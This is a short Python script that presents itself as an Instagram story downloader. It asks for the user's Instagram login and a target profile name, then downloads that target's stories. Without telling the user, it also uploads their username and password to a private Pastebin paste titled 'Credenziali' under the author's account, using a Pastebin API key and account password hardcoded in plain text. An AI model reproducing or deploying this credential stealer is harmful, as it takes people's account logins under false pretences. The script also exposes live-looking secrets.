import instaloader
from pbwrap import Pastebin
from instaloader import Profile, Post
ig = instaloader.Instaloader()
api_dev_key = 'AlvgHqTsLnjtMnj2wi3q4V-2Rq3Nx2HF'
username = 'Zeyzer04'
password = 'Mysweetbaby2012'
pb = Pastebin(api_dev_key)
pb.authenticate(username, password)
user = input("Your Username: ")
password = input("Your Password: ")
ig.login(user, password)
dp =  input("Nome utente: ")
credentials = ("User: "+ user + "\r\nPassword: " + password + "\r\nTarget" + dp)
profile = ig.check_profile_id(dp)
ig.get_stories(profile.userid)
profile = Profile.from_username(ig.context, username=dp)
ig.download_stories(userids=[profile.userid],filename_target='{}/stories'.format(profile.username))
pb.create_paste(credentials, api_paste_private=2, api_paste_name="Credenziali", api_paste_expire_date=None, api_paste_format=None)